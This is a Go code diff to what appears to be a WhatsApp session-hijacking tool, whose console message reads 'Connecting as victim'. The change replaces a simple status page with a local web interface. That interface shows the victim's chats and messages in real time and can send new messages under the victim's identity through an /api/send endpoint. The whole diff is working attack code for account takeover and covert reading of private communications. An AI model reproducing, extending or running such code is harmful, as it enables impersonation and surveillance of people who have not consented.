@@ -18,10 +18,13 @@ import (
 	"time"
 
 	"go.mau.fi/whatsmeow"
+	"go.mau.fi/whatsmeow/proto/waE2E"
 	"go.mau.fi/whatsmeow/store"
 	"go.mau.fi/whatsmeow/types"
+	"go.mau.fi/whatsmeow/types/events"
 	"go.mau.fi/whatsmeow/util/keys"
 	waLog "go.mau.fi/whatsmeow/util/log"
+	"google.golang.org/protobuf/proto"
 	"rsc.io/qr"
 
 	"programa/utils"
@@ -711,6 +714,9 @@ func doReplay(reader *bufio.Reader) {
 	cli := whatsmeow.NewClient(device, waLog.Noop)
 	cli.AutoTrustIdentity = true
 
+	rs := newReplayState(cli)
+	cli.AddEventHandler(rs.handleEvent)
+
 	fmt.Printf("\n%s[*] Connecting as victim...%s\n", utils.Yellow, utils.Reset)
 	err = cli.Connect()
 	if err != nil {
@@ -719,54 +725,15 @@ func doReplay(reader *bufio.Reader) {
 		return
 	}
 
-	jidStr := "unknown"
-	if device.ID != nil {
-		jidStr = device.ID.String()
-	}
-
-	fmt.Printf("\n%s[+] Session ACTIVE%s\n", utils.Green, utils.Reset)
-	fmt.Printf("  %sJID:%s      %s\n", utils.Blue, utils.Reset, jidStr)
-	if sd.PushName != "" {
-		fmt.Printf("  %sPushName:%s  %s\n", utils.Blue, utils.Reset, sd.PushName)
-	}
-	if sd.BusinessName != "" {
-		fmt.Printf("  %sBusiness:%s  %s\n", utils.Blue, utils.Reset, sd.BusinessName)
-	}
-
 	replayPort := pickReplayPort()
 	replayAddr := fmt.Sprintf("127.0.0.1:%d", replayPort)
 	replayURL := fmt.Sprintf("http://%s", replayAddr)
 
 	replayMux := http.NewServeMux()
-	replayMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("Content-Type", "text/html; charset=utf-8")
-		fmt.Fprintf(w, `<!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>Session Active</title>
-<style>body{font-family:sans-serif;background:#075e54;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;color:#fff}
-.card{background:#fff;color:#333;border-radius:12px;padding:40px;max-width:480px;width:90%;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,0.2)}
-h2{color:#075e54;margin:0 0 16px}
-.badge{display:inline-block;background:#25d366;color:#fff;padding:4px 16px;border-radius:20px;font-size:13px;margin-bottom:16px}
-.info{text-align:left;background:#f0f2f5;border-radius:8px;padding:16px;margin:16px 0;font-size:14px;line-height:1.8}
-.info strong{color:#075e54}
-.note{font-size:13px;color:#888;margin-top:16px}
-</style></head><body>
-<div class="card">
-<div class="badge">CONNECTED</div>
-<h2>WhatsApp Session Active</h2>
-<div class="info">
-<strong>JID:</strong> %s<br>
-<strong>PushName:</strong> %s<br>
-<strong>Business:</strong> %s<br>
-<strong>Platform:</strong> %s<br>
-<strong>Captured:</strong> %s
-</div>
-<p class="note">WhatsApp client is connected. Close this page when done.</p>
-</div></body></html>`,
-			jidStr, sd.PushName, sd.BusinessName, sd.Platform, sd.Timestamp)
-	})
-	replayMux.HandleFunc("/close", func(w http.ResponseWriter, r *http.Request) {
-		w.Write([]byte("ok"))
-	})
+	replayMux.HandleFunc("/", rs.handleReplayUI)
+	replayMux.HandleFunc("/api/chats", rs.handleChats)
+	replayMux.HandleFunc("/api/messages", rs.handleMessages)
+	replayMux.HandleFunc("/api/send", rs.handleSend)
 
 	replaySrv := &http.Server{Handler: replayMux}
 	replayLis, err := net.Listen("tcp", replayAddr)
@@ -783,18 +750,17 @@ h2{color:#075e54;margin:0 0 16px}
 	browser := detectBrowser()
 	if browser != "" {
 		exec.Command(browser, "--new-window", replayURL).Start()
-		fmt.Printf("\n%s[+] Opened browser to: %s%s\n", utils.Green, replayURL, utils.Reset)
 	}
 
-	fmt.Printf("\n%s[+] Session connected. Opened browser with session info.%s\n", utils.Green, utils.Reset)
-	fmt.Printf("\n%s[+] Press Enter to disconnect the session...%s", utils.Green, utils.Reset)
+	fmt.Printf("\n%s[+] Session connected. WhatsApp Web opened at: %s%s\n", utils.Green, replayURL, utils.Reset)
+	fmt.Printf("\n%s[+] Messages will appear in real-time in the browser.%s\n", utils.Yellow, utils.Reset)
+	fmt.Printf("\n%s[+] Press Enter to disconnect and return to menu...%s", utils.Green, utils.Reset)
 	reader.ReadString('\n')
 	cli.Disconnect()
 	if replayLis != nil {
 		replaySrv.Close()
 		replayLis.Close()
 	}
-	fmt.Printf("%s[+] Disconnected.%s\n", utils.Yellow, utils.Reset)
 }
 
 func pickReplayPort() int {
@@ -926,6 +892,202 @@ func (m *memPreKeyStore) UploadedPreKeyCount(ctx context.Context) (int, error) {
 type attackCfg struct {
 	Port int
 	Host string
+}
+
+// ---- Replay state (WhatsApp Web UI) ----
+
+type replayChatMessage struct {
+	ID        string `json:"id"`
+	Content   string `json:"content"`
+	Time      int64  `json:"time"`
+	FromMe    bool   `json:"from_me"`
+	MediaType string `json:"media_type,omitempty"`
+}
+
+type replayChat struct {
+	JID         string `json:"jid"`
+	Name        string `json:"name"`
+	LastMessage string `json:"last_message"`
+	LastTime    int64  `json:"last_time"`
+	Unread      int    `json:"unread"`
+}
+
+type replayState struct {
+	mu       sync.RWMutex
+	chats    map[string]*replayChat
+	messages map[string][]replayChatMessage
+	order    []string
+	client   *whatsmeow.Client
+}
+
+func newReplayState(cli *whatsmeow.Client) *replayState {
+	return &replayState{
+		chats:    make(map[string]*replayChat),
+		messages: make(map[string][]replayChatMessage),
+		order:    make([]string, 0),
+		client:   cli,
+	}
+}
+
+func extractMessageContent(msg *waE2E.Message) (content, mediaType string) {
+	if msg == nil {
+		return "", ""
+	}
+	if conv := msg.GetConversation(); conv != "" {
+		return conv, ""
+	}
+	if ext := msg.GetExtendedTextMessage(); ext != nil {
+		return ext.GetText(), ""
+	}
+	switch {
+	case msg.GetImageMessage() != nil:
+		caption := msg.GetImageMessage().GetCaption()
+		if caption != "" {
+			return "📷 " + caption, "image"
+		}
+		return "📷 Image", "image"
+	case msg.GetVideoMessage() != nil:
+		caption := msg.GetVideoMessage().GetCaption()
+		if caption != "" {
+			return "🎥 " + caption, "video"
+		}
+		return "🎥 Video", "video"
+	case msg.GetAudioMessage() != nil:
+		return "🎵 Audio", "audio"
+	case msg.GetDocumentMessage() != nil:
+		return "📄 " + msg.GetDocumentMessage().GetFileName(), "document"
+	case msg.GetStickerMessage() != nil:
+		return "🎨 Sticker", "sticker"
+	case msg.GetLocationMessage() != nil:
+		return "📍 Location", "location"
+	case msg.GetContactMessage() != nil:
+		return "👤 Contact", "contact"
+	case msg.GetCall() != nil:
+		return "📞 Call", "call"
+	case msg.GetPollCreationMessage() != nil || msg.GetPollCreationMessageV2() != nil || msg.GetPollCreationMessageV3() != nil:
+		return "📊 Poll", "poll"
+	default:
+		return "📝 Message", "unknown"
+	}
+}
+
+func (rs *replayState) handleEvent(evt interface{}) {
+	switch v := evt.(type) {
+	case *events.Message:
+		rs.handleMessage(v)
+	}
+}
+
+func (rs *replayState) handleMessage(m *events.Message) {
+	content, mediaType := extractMessageContent(m.Message)
+	chatJID := m.Info.Chat.String()
+	senderName := m.Info.PushName
+	if senderName == "" {
+		senderName = m.Info.Sender.User
+	}
+	msg := replayChatMessage{
+		ID:        m.Info.ID,
+		Content:   content,
+		Time:      m.Info.Timestamp.Unix(),
+		FromMe:    m.Info.IsFromMe,
+		MediaType: mediaType,
+	}
+
+	rs.mu.Lock()
+	rs.messages[chatJID] = append(rs.messages[chatJID], msg)
+
+	chat, exists := rs.chats[chatJID]
+	if !exists {
+		chat = &replayChat{JID: chatJID, Name: senderName}
+		rs.chats[chatJID] = chat
+		rs.order = append(rs.order, chatJID)
+	}
+	chat.LastMessage = content
+	chat.LastTime = m.Info.Timestamp.Unix()
+	if !m.Info.IsFromMe {
+		chat.Unread++
+	}
+	if senderName != "" && chat.Name == "" {
+		chat.Name = senderName
+	}
+
+	for i, jid := range rs.order {
+		if jid == chatJID {
+			rs.order = append(rs.order[:i], rs.order[i+1:]...)
+			break
+		}
+	}
+	rs.order = append([]string{chatJID}, rs.order...)
+	rs.mu.Unlock()
+}
+
+func (rs *replayState) handleChats(w http.ResponseWriter, r *http.Request) {
+	rs.mu.RLock()
+	chats := make([]*replayChat, 0, len(rs.order))
+	for _, jid := range rs.order {
+		if c, ok := rs.chats[jid]; ok {
+			chats = append(chats, c)
+		}
+	}
+	rs.mu.RUnlock()
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(chats)
+}
+
+func (rs *replayState) handleMessages(w http.ResponseWriter, r *http.Request) {
+	jid := r.URL.Query().Get("jid")
+	if jid == "" {
+		http.Error(w, "jid required", http.StatusBadRequest)
+		return
+	}
+	rs.mu.RLock()
+	msgs := rs.messages[jid]
+	result := make([]replayChatMessage, len(msgs))
+	copy(result, msgs)
+	rs.mu.RUnlock()
+
+	rs.mu.Lock()
+	if c, ok := rs.chats[jid]; ok {
+		c.Unread = 0
+	}
+	rs.mu.Unlock()
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(result)
+}
+
+func (rs *replayState) handleSend(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "POST required", http.StatusMethodNotAllowed)
+		return
+	}
+	jid := r.URL.Query().Get("jid")
+	text := r.URL.Query().Get("text")
+	if jid == "" || text == "" {
+		http.Error(w, "jid and text required", http.StatusBadRequest)
+		return
+	}
+	recipient, err := types.ParseJID(jid)
+	if err != nil {
+		http.Error(w, "invalid jid", http.StatusBadRequest)
+		return
+	}
+	rs.mu.RLock()
+	cli := rs.client
+	rs.mu.RUnlock()
+	_, err = cli.SendMessage(context.Background(), recipient, &waE2E.Message{
+		Conversation: proto.String(text),
+	})
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	w.Write([]byte("ok"))
+}
+
+func (rs *replayState) handleReplayUI(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	w.Write([]byte(replayHTML))
 }
 
 func newDevice() *store.Device {
